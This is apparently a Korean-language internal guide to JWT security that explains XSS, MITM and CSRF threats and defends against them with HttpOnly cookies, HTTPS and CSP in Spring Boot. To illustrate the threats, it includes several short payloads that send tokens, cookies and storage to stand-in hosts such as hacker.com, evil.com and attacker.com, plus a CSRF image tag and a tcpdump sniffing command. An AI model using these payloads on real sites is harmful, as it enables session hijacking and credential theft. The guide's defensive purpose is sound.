# JWT 보안 가이드

## 📋 개요

JWT(JSON Web Token) 사용 시 발생할 수 있는 보안 위협과 이를 방어하는 방법에 대한 종합 가이드입니다.

---

## 🚨 JWT 보안 위협

### 1. XSS (Cross-Site Scripting) 공격
```javascript
// 악성 스크립트가 페이지에 삽입됨
<script>
  // 😈 공격자가 JWT 토큰 훔치기
  const token = localStorage.getItem('token');
  fetch('http://hacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({token: token})
  });
</script>
```

**위험도**: 🔴 **매우 높음**
**피해**: 사용자 인증 정보 완전 탈취

### 2. MITM (Man-in-the-Middle) 공격
```
👤 사용자 ──HTTP──> 🕵️ 공격자 ──HTTP──> 🖥️ 서버
                    ↑
                JWT 토큰 가로채기
```

**위험도**: 🟡 **중간** (공개 WiFi 등)
**피해**: 네트워크 트래픽 도청으로 토큰 탈취

### 3. CSRF (Cross-Site Request Forgery) 공격
```html
<!-- 악성 사이트에서 -->
<img src="http://bank.com/transfer?to=hacker&amount=1000000" />
<!-- 사용자가 은행에 로그인되어 있다면 자동 실행 -->
```

**위험도**: 🟠 **높음**
**피해**: 사용자 모르게 악의적인 요청 실행

---

## 🛡️ 보안 해결책

### 1. HttpOnly Cookie 사용

#### 문제: localStorage의 XSS 취약성
```javascript
// ❌ 위험한 방식 - JavaScript로 접근 가능
localStorage.setItem('token', 'eyJhbGciOiJIUzI...');
const token = localStorage.getItem('token'); // XSS로 탈취 가능!

// ❌ sessionStorage도 마찬가지
sessionStorage.setItem('token', 'eyJhbGciOiJIUzI...');
```

#### 해결책: HttpOnly Cookie
```java
// 백엔드에서 HttpOnly 쿠키 설정
@PostMapping("/login")
public ResponseEntity<LoginResponse> login(HttpServletResponse response) {
    String token = jwtProvider.generateToken(user);
    
    // ✅ HttpOnly 쿠키로 설정
    Cookie cookie = new Cookie("token", token);
    cookie.setHttpOnly(true);  // 🔑 JavaScript 접근 차단!
    cookie.setSecure(true);    // HTTPS에서만 전송
    cookie.setMaxAge(3600);    // 1시간 후 만료
    cookie.setPath("/");
    
    response.addCookie(cookie);
    return ResponseEntity.ok(new LoginResponse("로그인 성공"));
}
```

**방어 효과:**
```javascript
// 🚫 XSS 공격으로도 접근 불가!
console.log(document.cookie); // "token=..." 보이지 않음
const token = document.cookie.match(/token=([^;]+)/); // undefined
```

### 2. HTTPS 강제 사용

#### 문제: HTTP 평문 전송
```
👤 사용자 ─── HTTP (평문) ───> 🖥️ 서버
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6...
         ↑
    🕵️ 공격자가 패킷 스니핑으로 토큰 훔침
```

#### 해결책: HTTPS 암호화
```java
// Spring Boot에서 HTTPS 강제
@Configuration
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) {
        return http
            .requiresChannel(channel -> 
                channel.anyRequest().requiresSecure()) // HTTPS 강제
            .headers(headers -> headers
                .httpStrictTransportSecurity(hstsConfig -> hstsConfig
                    .maxAgeInSeconds(31536000) // 1년
                    .includeSubdomains(true)
                )
            )
            .build();
    }
}
```

**방어 효과:**
```
👤 사용자 ─── HTTPS (암호화) ───> 🖥️ 서버
🔒 TLS/SSL 암호화로 패킷 내용 보호
         ↓
🕵️ 공격자: "암호화된 데이터만 보임, 토큰 못 훔침"
```

### 3. CSP (Content Security Policy) 적용

#### 문제: XSS로 악성 스크립트 실행
```html
<!-- 공격자가 댓글 등에 악성 스크립트 삽입 -->
<div class="comment">
  안녕하세요! 
  <script>
    // 😈 악성 코드 실행
    fetch('http://hacker.com/steal', {
      body: localStorage.getItem('token')
    });
  </script>
</div>
```

#### 해결책: CSP 헤더 설정
```java
// Spring Boot에서 CSP 헤더 설정
@Configuration
public class SecurityConfig {
    
    @Bean
    public FilterRegistrationBean<CSPFilter> cspFilter() {
        FilterRegistrationBean<CSPFilter> registrationBean = new FilterRegistrationBean<>();
        registrationBean.setFilter(new CSPFilter());
        registrationBean.addUrlPatterns("/*");
        return registrationBean;
    }
}

public class CSPFilter implements Filter {
    
    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) {
        HttpServletResponse httpResponse = (HttpServletResponse) response;
        
        httpResponse.setHeader("Content-Security-Policy", 
            "default-src 'self'; " +                    // 자신의 도메인만 허용
            "script-src 'self' 'unsafe-inline'; " +     // 인라인 스크립트 제한
            "connect-src 'self' https://api.myapp.com; " + // API 호출 도메인 제한
            "img-src 'self' data: https:; " +            // 이미지 소스 제한
            "style-src 'self' 'unsafe-inline'"          // CSS 스타일 제한
        );
        
        chain.doFilter(request, response);
    }
}
```

**방어 효과:**
```javascript
// 🚫 CSP에서 차단됨!
<script src="http://hacker.com/evil.js"></script>
// 브라우저 콘솔: "CSP 위반: 외부 스크립트 실행 차단됨"

// 🚫 외부 도메인으로 데이터 전송 차단!
fetch('http://hacker.com/steal', {...});
// 브라우저 콘솔: "CSP 위반: 허용되지 않은 도메인"
```

---

## 🎯 실제 공격 시나리오와 방어

### 시나리오 1: XSS + localStorage 공격

**공격 코드:**
```javascript
// 악성 스크립트가 페이지에 삽입
(function() {
    const token = localStorage.getItem('authToken');
    if (token) {
        const img = new Image();
        img.src = 'http://evil.com/collect?token=' + encodeURIComponent(token) + 
                  '&url=' + encodeURIComponent(window.location.href) + 
                  '&ua=' + encodeURIComponent(navigator.userAgent);
    }
})();
```

**방어 전략:**
```java
// ✅ HttpOnly Cookie 사용
@PostMapping("/login")
public ResponseEntity<String> login(HttpServletResponse response) {
    String token = jwtProvider.generateToken(user);
    
    ResponseCookie cookie = ResponseCookie.from("authToken", token)
        .httpOnly(true)      // JavaScript 접근 불가
        .secure(true)        // HTTPS에서만 전송
        .sameSite("Strict")  // CSRF 방지
        .maxAge(Duration.ofHours(1))
        .path("/")
        .build();
        
    response.setHeader("Set-Cookie", cookie.toString());
    return ResponseEntity.ok("로그인 성공");
}
```

### 시나리오 2: 네트워크 스니핑 공격

**공격 방법:**
```bash
# 공격자가 공개 WiFi에서 패킷 캡처
tcpdump -i wlan0 -A | grep "Authorization"
# HTTP 요청에서 JWT 토큰 탈취
```

**방어 전략:**
```yaml
# application.yml - HTTPS 강제 설정
server:
  port: 443
  ssl:
    enabled: true
    key-store: classpath:keystore.p12
    key-store-password: ${SSL_KEYSTORE_PASSWORD}
    key-store-type: PKCS12
    
# HTTP → HTTPS 리다이렉트
---
server:
  port: 80
spring:
  security:
    require-ssl: true
```

### 시나리오 3: 악성 스크립트 삽입 공격

**공격 코드:**
```html
<!-- 게시판 등에 악성 댓글 작성 -->
<img src="x" onerror="
  var xhr = new XMLHttpRequest();
  xhr.open('POST', 'http://attacker.com/steal');
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.send(JSON.stringify({
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage)
  }));
">
```

**방어 전략:**
```java
// CSP 헤더로 인라인 스크립트 차단
@RestController
public class AuthController {
    
    @GetMapping("/")
    public String index(HttpServletResponse response) {
        response.setHeader("Content-Security-Policy", 
            "default-src 'self'; " +
            "script-src 'self'; " +              // 인라인 스크립트 완전 차단
            "img-src 'self' data:; " +
            "connect-src 'self' https://api.ourapp.com"
        );
        return "index";
    }
}
```

---

## 💡 통합 보안 전략

### 3중 보안 레이어
```
🛡️ 1층: HttpOnly Cookie
   ↓ XSS로도 토큰 접근 불가
   
🛡️ 2층: HTTPS
   ↓ 네트워크에서 토큰 탈취 불가
   
🛡️ 3층: CSP
   ↓ 악성 스크립트 실행 자체를 차단
```

### 완전한 보안 구현 예시

```java
@RestController
@RequestMapping("/auth")
public class SecureAuthController {
    
    @PostMapping("/login")
    public ResponseEntity<LoginResponse> login(
        @RequestBody LoginRequest request,
        HttpServletRequest httpRequest,
        HttpServletResponse response
    ) {
        // 1. 사용자 인증
        AuthResult authResult = authService.authenticate(request);
        
        // 2. JWT 토큰 생성
        String token = jwtProvider.generateToken(authResult.getUser());
        
        // 3. 🔐 보안 강화된 쿠키 설정
        ResponseCookie cookie = ResponseCookie.from("authToken", token)
            .httpOnly(true)           // XSS 방지
            .secure(true)             // HTTPS에서만 전송
            .sameSite("Strict")       // CSRF 방지
            .maxAge(Duration.ofHours(1))
            .path("/")
            .domain(getDomain(httpRequest))
            .build();
            
        response.setHeader("Set-Cookie", cookie.toString());
        
        // 4. 보안 헤더 설정
        response.setHeader("Content-Security-Policy", 
            "default-src 'self'; " +
            "script-src 'self'; " +
            "img-src 'self' data: https:; " +
            "connect-src 'self' https://api.ourapp.com"
        );
        
        response.setHeader("X-Content-Type-Options", "nosniff");
        response.setHeader("X-Frame-Options", "DENY");
        response.setHeader("X-XSS-Protection", "1; mode=block");
        
        return ResponseEntity.ok(new LoginResponse(
            "로그인 성공",
            authResult.getUser().getName(),
            authResult.getUser().getRoles()
        ));
    }
    
    @PostMapping("/logout")
    public ResponseEntity<String> logout(HttpServletResponse response) {
        // 쿠키 삭제
        ResponseCookie cookie = ResponseCookie.from("authToken", "")
            .httpOnly(true)
            .secure(true)
            .sameSite("Strict")
            .maxAge(Duration.ZERO)  // 즉시 만료
            .path("/")
            .build();
            
        response.setHeader("Set-Cookie", cookie.toString());
        return ResponseEntity.ok("로그아웃 성공");
    }
}
```

---

## 🔍 보안 검증 방법

### 1. XSS 방어 테스트
```javascript
// 개발자 도구 콘솔에서 테스트
console.log(document.cookie); // authToken이 보이지 않아야 함
localStorage.getItem('authToken'); // null이어야 함
```

### 2. HTTPS 강제 테스트
```bash
# HTTP로 접속 시도
curl -I http://localhost:8080/auth/login
# 응답: 301 Moved Permanently (HTTPS로 리다이렉트)
```

### 3. CSP 방어 테스트
```html
<!-- 페이지에 삽입해보기 -->
<script>alert('XSS')</script>
<!-- 브라우저 콘솔에 CSP 위반 에러가 나타나야 함 -->
```

---

## 📚 추가 보안 권장사항

### 1. JWT 토큰 설계
```java
// 토큰에 최소한의 정보만 포함
{
  "sub": "user123",
  "roles": ["USER"],
  "exp": 1640995200,
  "iat": 1640991600
}
// ❌ 민감한 정보 포함 금지: 비밀번호, 신용카드 번호 등
```

### 2. 토큰 만료 시간 관리
```java
// 짧은 Access Token + 긴 Refresh Token
AccessToken: 15분
RefreshToken: 7일

// 또는 사용자 활동에 따른 동적 만료
if (isHighSecurityAction) {
    tokenExpiry = Duration.ofMinutes(5);  // 중요한 작업은 짧게
} else {
    tokenExpiry = Duration.ofHours(1);    // 일반 작업은 길게
}
```

### 3. 토큰 무효화 전략
```java
// Redis를 이용한 토큰 블랙리스트
@Service
public class TokenBlacklistService {
    
    @Autowired
    private RedisTemplate<String, String> redisTemplate;
    
    public void blacklistToken(String token, Duration remainingTime) {
        redisTemplate.opsForValue().set(
            "blacklist:" + token, 
            "true", 
            remainingTime
        );
    }
    
    public boolean isBlacklisted(String token) {
        return redisTemplate.hasKey("blacklist:" + token);
    }
}
```

---

## 🚨 보안 체크리스트

### 클라이언트 사이드
- [ ] HttpOnly 쿠키 사용 (localStorage/sessionStorage 금지)
- [ ] HTTPS 강제 적용
- [ ] CSP 헤더 설정
- [ ] SameSite=Strict 설정
- [ ] 보안 헤더 적용 (X-Frame-Options, X-XSS-Protection 등)

### 서버 사이드  
- [ ] JWT 서명 키 안전하게 관리
- [ ] 토큰 만료 시간 적절히 설정
- [ ] 토큰 무효화 메커니즘 구현
- [ ] Rate Limiting 적용
- [ ] 로그인 실패 횟수 제한

### 운영 환경
- [ ] SSL/TLS 인증서 정기 갱신
- [ ] 보안 로그 모니터링
- [ ] 정기 보안 감사
- [ ] 침투 테스트 수행

---

**작성일**: 2025-01-11  
**최종 수정**: Member Service 개발팀  
**참고 문서**: [OWASP JWT Security](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
